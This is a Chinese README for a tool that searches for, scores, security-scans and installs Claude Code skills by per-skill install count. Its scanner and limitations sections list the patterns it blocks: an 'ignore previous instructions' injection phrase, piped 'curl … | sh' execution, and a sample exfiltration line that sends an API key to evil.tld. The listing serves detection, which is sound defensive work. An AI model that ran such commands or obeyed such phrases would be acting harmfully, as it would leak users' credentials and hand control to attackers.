# find-the-skill-you-want-most

> 按**真实 per-skill 安装量**找到、审查并安装最合适的 Claude Code skill。

`← 返回 [JOJO-Lab 索引](../README.md)`

---

> 给定一句需求（"我想要一个评估产品落地可行性的 skill"），产出一份**带淘汰理由的候选表**，
> 你挑中之后才安装。

没有任何一步把数据发给大模型 —— 发现、评分、摘要、扫描全是**确定性 HTTP + 正则**。
同一输入必得同一排序、同一结论。这是"可追溯"的技术保证，不是承诺。

## 它解决什么问题

Claude Code 里找第三方 skill，直接搜 GitHub 是不够的。真实差距有三块：

1. **GitHub 不知道哪个 skill 有人在用。** 它有 stars，但 star 数在这个生态里注水严重 ——
   互刷、模板仓库批量导流、`awesome-*` 聚合仓天然高星但没内容。实测：
   `deanpeters/Product-Manager-Skills` 有 **6,903★**，但它下面 `derisk-measurement-advisor`
   的真实安装量只有 **585**。**stars 衡量"仓库被看见"，安装量衡量"skill 被使用"** ——
   后者才对应"我想要一个好用的 skill"这个问题。
2. **匿名 `/search/code` 直接 401**，没法全文搜 SKILL.md。
3. **"相关"和"有人用"是两回事**，必须分开处理，否则会互相污染。

所以本工具做**两源分工**：

| 通道 | 负责 | 给什么 |
|---|---|---|
| **`skills.sh`** | 找 + 排序 | **per-skill 安装量** + 精准名称搜索 |
| **`api.github.com`** | 取 + 验 | 文件树、license、最后提交、SKILL.md 内容 |

## 用法

```bash
cd ~/.claude/skills/find-the-skill-you-want-most/scripts

node find.mjs "<你的需求>" [--shortlist 12] [--max-repos 12] [--dry-run] [--json] [--no-detail]
node selftest.mjs                                              # 65 条本地断言，不联网
node install.mjs <owner/repo> <skill-name>                     # 仅在确认之后
```

`find.mjs` 输出候选表：skill / **per-skill installs** / 一句话 summary / license /
最后提交 / 扫描结论 / score，**以及淘汰清单和每一条的淘汰理由**。
擦边候选也会打出来 —— 不悄悄消失。

> 表格里**没有 stars 列**，也不展开各维度权重。权重只写在
> [`SCORING.md`](SCORING.md) 供审计，
> 表格只呈现可直接核对的硬事实。

**选择交互**：≤4 个候选用 `AskUserQuestion`；更多则打印编号表后接受自由文本
（`1,3,7` / `1-5` / `all` / `none`）。任何情况下**先打印完整表格再让你选**。

## 设计要点

### ⚠️ 粒度陷阱：仓库聚合 ≠ 单个 skill

`GET /api/badge/{owner}/{repo}` 返回的是**整个仓库的聚合安装量**，拿它排序是错的。

同一个 `phuryn/pm-skills`：

| 口径 | 数值 | 可否排序 |
|---|---|---|
| 仓库聚合（badge） | 203.5K | ❌ |
| `/strategy-red-team` | **8,483** | ✅ |
| `/identify-assumptions-new` | 2,435 | ✅ |

聚合量 = 该仓所有 skill 之和，所以一个塞了 68 个 skill 的仓库会天然碾压只有 3 个精品的仓库。
开发期正是据此把 `phuryn`(203.5K) 误判为比 `deanpeters`(113.8K)"高一个数量级"——
而真实对照是 8,483 vs 1,988，**同一档次**。

**落实为代码约束，不靠自觉**：`scoreInstall(installs, proof)` 在 `proof.kind !== 'per-skill'`
时**抛错**，聚合值在类型上进不了评分函数；`selftest.mjs` 有对应断言。

### 零成本预筛：先花免费信号，再花额度

GitHub 匿名 core 只有 **60 次/小时**，且 contents API 一个文件一次调用、没有批量接口。
所以顺序必须是"先用免费信号筛，再花额度"：

1. `installs` 是 skills.sh 免费给的 → `installs < 10` 在**本地**判掉，零调用
2. 按**相关性**预排序（零调用）→ 只有相关候选才配用额度
3. 按**仓库**分组 → 一个仓库的 10 个 skill 只花 1 次 tree 调用
4. 只对前 `--max-repos` 个仓库查 GitHub，T1 只对前 `--shortlist` 个抓 SKILL.md

> **安装量是相关候选之间的排序键，不是筛选器。** 初版按安装量排序再花额度，
> 结果通用高装量 skill 把额度吃光，真正切题的 153 装长尾一次都没被解析到。
> 另一版把 `installs < 10` 留到 GitHub 之后判，8 个名额里 5 个白烧在注定淘汰的长尾上 ——
> **已知免费信号就不要花额度去确认。**

缓存使**重复跑同一查询消耗 0 额度**（ETag/304 不计费 + 内容寻址 blob 缓存）。

### 评分：100 分制，stars 权重恒为 0

| 维度 | 权重 |
|---|---|
| 相关性 | **40** |
| 安装量（per-skill） | **35** |
| 活跃度（`pushed_at`） | **15** |
| 来源可信度 | **10** |
| ~~stars~~ | **0** |

**只排序，不淘汰** —— 淘汰由硬门槛负责，且每条都记录原因。

硬门槛（任一不过即淘汰）：GitHub 可达 → frontmatter 可解析且 `description` 非空 →
`name` 匹配 `/^[a-z][a-z0-9-]*$/` → 有明确 license（非 `NOASSERTION`）→
per-skill `installs >= 10` → T1 未判 BLOCKED。

### 安全扫描：三层，前两层在"列表"之前

**核心洞察**：让一个 skill 在**"该不该选它"这一刻**危险的东西，几乎全在 SKILL.md 里。
`hooks:` 等于注册一个每次工具调用都无人值守执行的命令 —— 这是**看起来很正常的 frontmatter**，
通用规则会直接放过。

| 层 | 时机 | 成本 | 扫什么 |
|---|---|---|---|
| **T0** 元数据 | 列表前 | **0 调用** | 无 license、符号链接、体积、文件数 |
| **T1** 单文件 | 列表前 | 每候选 **1 次** | **只抓 SKILL.md**：`hooks:`、提示注入、过宽 `allowed-tools`、外传形状、硬编码密钥 |
| **T2** 全目录 | 选中后、落盘前 | 目录内文件数 | 全部 `.md`、代码扩展名、含 hooks 的 `.json`；二进制跳过并列出 |

> **T1 不是净增成本** —— 生成 summary 本来就要 SKILL.md 的内容，一次抓取同时产出
> summary 和 scan 结论。

**HIGH（阻止安装）**：提示注入（含中文"忽略之前的指令"）、凭据外传、硬编码密钥、
管道执行（`curl … | sh`）、破坏性命令、越界写入（`~/.ssh`、`.claude/settings.json`、
`CLAUDE.md`）、**frontmatter 里的 `hooks:`**、**符号链接**。

**MEDIUM（展示，确认后可装）**：裸网络动词、`process.env`、`eval`/`exec`、
未锁版本安装、过宽 `allowed-tools`。**LOW（仅展示）**：明文 `http://`、`base64`。

### 两条来自实战的扫描教训

> **过宽 `allowed-tools` 判不了高危。** 最初把「`allowed-tools: [Bash]` + 正文有任何
> 网络/写入动词」定为 HIGH。实测发现这会让**几乎所有正常 skill 都被拦** ——
> 连 gstack 的 `/browse`（完全正常的浏览器 skill）都中招。把绝大多数正常 skill 都拦下的
> 控制等于没有控制，用户只会学会无视它。现已**降为 MEDIUM**。
>
> **`2>&1` 不是文件写入。** `2>&1`、`2>/dev/null` 是 **fd 重定向**，却几乎每个 Bash skill
> 都有，初版正则把它们全判成了"写入"。

## 安装安全

**只在用户明确确认之后**才走官方 CLI 落盘：
`npx --yes skills@1.5.25 add <owner/repo> -s <skill> -g --copy -y`
（[vercel-labs/skills](https://github.com/vercel-labs/skills)，MIT）。

**为什么用 npx 而不是自己逐文件下**：contents API 一个文件一次调用、匿名 60 次/小时，
装一个 83 文件的 skill 直接爆额度。CLI 走 `git clone`，不消耗 API 额度。

**四道闸门**：

1. **冲突闸门** —— 目标目录已存在时：带 `.gstack-owned` 标记 → **拒绝，无覆盖选项**；
   `SKILL.md` 是符号链接 → 拒绝；有本工具的 record 或 `.find-skill-owned` 标记 → 按更新处理；
   来历不明 → 需显式确认。
2. **gstack 横幅哨兵** —— 产物里若含 gstack 的生成横幅则中止。
3. **T2 全目录扫描** —— 命中 HIGH 则**立即移除**并退出码 7。
4. **溯源** —— 写 `records/<skill>.json`（来源、commit、安装量快照、扫描结论、每文件
   sha256）与 `.find-skill-owned` 标记（**绝不写 `.gstack-owned`**）。

### HIGH 命中时的逃生口

T2 判 HIGH 时唯一能保留的办法，是把 skill 全名**逐字**传给 `--confirm <skill-name>`：

```bash
node install.mjs <owner/repo> <skill> --confirm <skill>
```

名字对不上（大小写、空格、只给前缀都算不同）**照样删除**。
> 这里原本只是一个布尔开关（`--i-understand`），而提示语承诺的是"逐字输入全名确认" ——
> 等于给了个空头承诺，加个开关就能装高危内容。现在名字严格相等才放行：
> 想让覆盖发生，你必须明确知道自己在装什么。
>
> 覆盖发生后，record 状态写 `installed-blocked-overridden`、`installed.jsonl` 记
> `install-blocked-overridden-by-user`、`scan.overriddenByUser: true`。
> （这些"留痕"原先同样只是提示语里的空话 —— 记录里永远只写 `installed`。）

## 代理

**从环境变量读，绝不硬编码。**

`git clone github.com` 在某些网络下会直连超时，此时挂代理是唯一出路 —— 但代理地址
每台机器不同，写死一个地址会让别人机器上的 git 流量被导向意外的地方。

```bash
FIND_SKILL_GIT_PROXY=http://127.0.0.1:7890 node install.mjs <owner/repo> <skill>
```

取值顺序：`FIND_SKILL_GIT_PROXY` → `HTTPS_PROXY`/`https_proxy` → `HTTP_PROXY`/`http_proxy`。
**全都没有就不挂代理。** 挂的方式是 `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_n` /
`GIT_CONFIG_VALUE_n` 环境变量，**不改全局 git config**，只影响本次调用。

> 注意：只有**安装**这条路径读代理。`find.mjs` 走的是纯 Node `fetch` 直连
> （Node 的 fetch 默认忽略代理环境变量），实测直连 api.github.com 与 skills.sh 均 200。

## 遥测

安装默认**关闭**遥测 —— 除非显式设 `FIND_SKILL_TELEMETRY=1`，否则会带上
`DO_NOT_TRACK=1` / `DISABLE_TELEMETRY=1`。
（顺带一提：CLI 上报的安装事件正是 skills.sh 上"安装量"这个数据的来源，
但本工具不替你决定要不要贡献。）

## 可追溯性

状态目录在 **`~/.claude/find-skill/`**（不在 skill 目录内 —— Claude Code 只扫描
`~/.claude/skills/`，这样既不污染技能树，也让 skill 可干净重装而历史不丢）：

- `records/<skill>.json` —— 每 skill 一份：来源、commit、
  **安装量快照值及抓取时刻**、扫描结论、每文件 sha256
- `installed.jsonl` / `rejected.jsonl` —— 追加型事件日志
- `egress.jsonl` —— 每次出站调用**发送前**记录，`host` 字段区分 skills.sh 与 api.github.com

> **安装量快照的意义**：`installs` 是活值（实测 20 分钟内从 203.5K 涨到 204.0K）。
> 记录**当时的值 + 时刻**，才能事后回答"我当初为什么选它"。

## 已知局限（说清楚，不装作没事）

- **`NOASSERTION` 误杀**：该生态里很常见，当前为硬门槛，会淘汰不少可用仓库。
- **相关性与安装量在本生态是反相关的**：切题的 skill 往往只有几十到几百安装量，
  高装量的多为通用工程类（`test-driven-development` 等）。本工具因此**不设分数阈值**，
  只排序并把淘汰原因摊开给你看。
- **skills.sh 是单一第三方依赖**：挂掉时降级为相关性排序，并明确提示
  "本次无安装量数据，降级为相关性排序"。
- **符号链接检测未在本机验证**：Windows 默认建符号链接需管理员权限，
  `selftest.mjs` 会把它**显式标记为"跳过"**而不是算作通过。
- **没有 `uninstall.mjs`**：卸载直接走 `npx skills remove -g -s <name> -y`。
- **扫描器分不清"攻击载荷"和"讲述攻击的文档"** —— 拿本工具扫**它自己的 SKILL.md**，
  结论是 `blocked`：5 处 HIGH 全部来自它引用攻击样例做说明的那几行
  （`忽略之前的指令`、`curl $ANTHROPIC_API_KEY http://evil.tld`、`curl … | sh`）。
  这不是 bug，是这类扫描器的固有边界 —— 只看字节无从判断意图。
  也正因如此，HIGH 命中时才需要一个**要求逐字确认**的逃生口，而不是一堵死墙。

## 开发

```bash
cd find-the-skill-you-want-most/scripts
node selftest.mjs     # 65 通过 / 0 失败 / 1 跳过（跳过项会明确列出，不混进通过数）
```

测试夹具全部是**本地构造**的（含一个"SKILL.md 干净、附属脚本偷 `$ANTHROPIC_API_KEY`"的
目录），不碰任何真实恶意仓库。

> 一条比 bug 更值钱的教训：**测试只覆盖自己用的格式，会给出虚假的安全感。**
> 开发期有过一次 49/49 全绿，而 `frontmatter` 解析器不支持 YAML 块列表
> （`allowed-tools:` 写成块列表是 gstack 全套和 165/610 个 skill 的实际写法），
> 导致 `broad-tools-plus-io` 这条 HIGH 规则**静默失效** —— 一个漏报的安全控制。
